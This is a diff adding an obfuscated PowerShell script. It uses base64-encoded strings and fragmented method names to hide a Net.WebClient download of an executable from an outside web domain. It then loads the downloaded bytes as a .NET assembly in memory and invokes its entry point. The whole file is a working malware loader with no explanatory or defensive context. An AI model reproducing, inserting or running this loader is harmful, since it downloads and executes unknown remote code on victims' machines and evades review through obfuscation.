@@ -1,0 +1,11 @@
+﻿$X = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9vcHRpbWFzb2x1dGlvbnMuc3RvcmUvWENsaWVudC5leGU='))
+$Y = [String]::Join('', [String]::Join('', 'Do', 'wn'), [String]::Join('', 'load', 'Data'))
+$Z = [String]::Join('', [String]::Join('', 'En', 'try'), [String]::Join('', 'Point'))
+$Q = New-Object ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV0LldlYkNsaWVudA==')))
+$W = $Q.([String]::Join('', $Y))($X)
+$K = [System.Reflection.Assembly]::Load([byte[]]$W)
+if ($K.([String]::Join('', $Z)) -ne $null) {
+    $K.([String]::Join('', $Z)).Invoke($null, $null)
+} else {
+    [Console]::WriteLine([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RW50cnlQb2ludCBub3QgZm91bmQu')))
+}
